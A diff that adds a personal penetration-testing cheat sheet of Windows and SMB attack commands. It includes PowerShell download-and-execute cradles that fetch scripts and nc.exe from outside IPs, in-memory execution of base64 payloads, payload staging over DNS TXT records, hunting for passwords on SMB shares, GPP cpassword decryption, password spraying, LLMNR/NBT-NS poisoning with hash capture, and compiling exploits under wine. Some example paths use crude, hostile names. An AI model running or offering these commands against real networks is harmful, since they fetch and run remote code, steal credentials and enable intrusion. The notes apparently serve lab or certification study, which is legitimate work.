@@ -1,0 +1,185 @@
+actual enum
+systeminfo
+sherlock.ps1 lol
+
+powershell.exe -ExecutionPolicy Bypass IEX(New-Object Net.Webclient).downloadString('http://1.1.1.1:80/sherlock.ps1')
+
+
+oS=server.createobject("wscript.shell")
+oS.Exec("ipconfig")
+
+check md5 hash
+certutil -hashfile asdf md5
+check sha256 hash - powershell
+Get-FileHash -algorithm SHA256 file.file
+
+https://rmusser.net/docs/Rants&Writeups/Writeups/Empire_and_Metasploit_101.html
+notes
+
+free windows vm for testing
+https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
+https://www.exploit-db.com/exploits/16806/
+
+
+sans powershell analyzing malware
+
+    git clone https://github.com/chrisjd20/power_dump.git
+    Have a powershell scrip running. Take its process ID and run the following:
+        procdump64.exe -ma <pid>
+    py -2 power_dump.py <-- Windows (if Py2 and py3 are installed)
+    python power_dump.py <-- Linux
+    Select option 1
+    ld powershell.exe_mem_dump1928461283
+    Select option 2 (wait for it to process)
+    Select option 3 or 4 to perform filter searching
+
+pip install oletools
+olevba.exe 
+did some doctoring with the format, piped to Out-File dropper.ps1
+
+
+
+
+
+
+#dump memory of proc with suspected usr/pass/etc.
+https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+procdump - dump mem of proc, then run strings, grep for password, etc.
+
+sans powershell
+#privesc using indexing TinyURL.com/Get-IndexedItem
+#this is also natively in empire
+powershell.exe -ExecutionPolicy Bypass 
+Import-Module .\get-indexeditem.ps1
+a few examples:
+Get-IndexedItem -Filter "Contains(*,'kostas')"
+Get-IndexedItem -Filter "Contains(*,'ihatethisperson')" -path C:\Users\fucker1
+Get-IndexedItem -Filter "Contains(*,'ihatethisperson')" -path C:\Users\fucker1 | select name | Select-String -Pattern docx
+look for user, pw, api keys, config files
+if testing for UNC share -path is recommended
+
+$storageDir = $pwd 
+$webclient = New-Object System.Net.WebClient 
+$url = "http://192.168.121.164/nc.exe" 
+$file = "nc.exe" 
+$webclient.DownloadFile($url,$file) 
+
+#if we have a proxy, add
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+
+#if we want to load something directly into mem:
+base64 -w0 powerthing.ps1 > pv.txt
+$payload = $wc.DownloadString("http://192.168.121.164/nc.exe")
+$sc = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))
+iex $sc
+Invoke-ShareFinder
+
+Resolve-DnsName -type TXT -Name asdf.com
+
+bind 9 zone file with a payload inside
+first pv line is the number of lines
+there's a python script to create this
+
+$a = Resolve-DnsName -type TXT -Name asdf.com | Where-Object Section -eq Answer | select -ExpandProperty Strings
+$a contains base64 text
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))
+
+$payload = 0..7862 | % {Resolve-DnsName -type TXT -Name pv$_.asdf.com | Where-Oject Section - eq Answer | Select - ExpandProperty Strings}
+$shell=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))
+
+
+
+#transfer vmx to ovf
+"C:\Program Files (x86)\VMware\VMware Player\OVFTool\ovftool.exe" "Kioptix Level 1.vmx" "D:\vms\vbox\kiolvl1\kio1.ovf"
+
+
+
+https://www.vulnhub.com/entry/hacklab-vulnix,48/
+
+https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#osint
+
+grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*
+
+#general smb enumeration
+nmap -T4 -v --script vuln 1.1.1.1
+#discover samba servers
+nbtscan 1.1.1.0/24
+#find open smb shares
+nmap -T4 -v -oA shares --script=smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24
+#smb client version
+smbclient -L //1.1.1.1
+#enumberate smb users
+nmap -sU -sS --script=smb-enum-users -p U:137,T:139 1.1.1.1-1.1.1.255 
+
+sans sneaking secrets from smb shares
+nmap -Pn -n -p139,445 1.1.1.0/24
+smbclient -L $SHARE -U USERNAME -W DOMAIN
+from meterpreter shell or windows client - net use M: \\1.1.1.1\$SHARE [/user:USER][password PASSWORD]
+findstr /si "password" M:\*
+type M:\notes.txt
+#list open smb shares
+smbmap -u user -p pass -d domain.com -H 1.1.1.1
+GPP settings are stored in SYSVOL's "Policies" folder - until 2014, domain's group policy preferences allowed config of local admin password
+net use M:\ \\1.1.1.1\SYSVOL
+findstr /si "password" M:\*
+found cpassword="lksdfjlkajs23lkj23lk4j23lk4jasdf"
+gpp-decrypt lksdfjlkajs23lkj23lk4j23lk4jasdf
+get admin pw
+look into crackmapexec - swiss army knife 
+
+custom tools from github.com/dafthack
+sans password spraying - owa mailsniper - xfreerdp,rdpspray-poc.py
+domain password spray - powershell script - requires 1 domain user's creds to run
+metasploit smb_login module
+outlook web access - OWA - mailsniper 
+xfreerdp - benefit of odd host logging
+
+
+python /usr/share/doc/python-impacket-doc/examples/samrdump.py 1.1.1.0
+#RID cycling
+/usr/share/set/src/fasttrack/ridenum.py 500 50000 /usr/share/wordlists/rockyou.txt
+#manual null session testing
+Win: net use \\1.1.1.1\IPC$ "" /u:""
+nix: smbclient -L //1.1.1.1
+nbtscan-unixwiz
+#metasploit llmnr/nbt-ns
+#spoof/poison
+auxiliary/spoof/llmnr/llmnr_response
+auxiliary/spoof/nbns/nbns_response
+#hashes 
+auxiliary/server/capture/smb
+auxiliary/server/capture/http_ntlm
+
+#kitchen sink
+enum4linux -a 1.1.1.1
+
+#snmp enum
+snmpcheck -t 1.1.1.1 -c public
+snmpwalk -c public -v1 1.1.1.1 255 | grep hrSWRunName
+snmpenum -t 1.1.1.1
+onesixtyone -c names -i host
+nmap -sV -p 161 --script=snmp-info 1.1.1.1-255
+/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
+
+https://blog.rapid7.com/2014/02/03/new-ms08-067/
+
+
+#compile windows exploits on kali - not tested
+  wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
+  wine mingw-get-setup.exe
+  select mingw32-base
+  cd /root/.wine/drive_c/windows
+  wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
+  cd /root/.wine/drive_c/MinGW/bin
+  wine gcc -o ability.exe /tmp/exploit.c -lwsock32
+  wine ability.exe  
+  
+  
+mount 192.168.1.1:/vol/share /mnt/nfs
+mount -t cifs -o username=user,domain=blah //192.168.1.X/share-name /mnt/cifs
+net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no
+
+#linux gui for browsing smb shares
+apt-get install smb4k -y
+
+
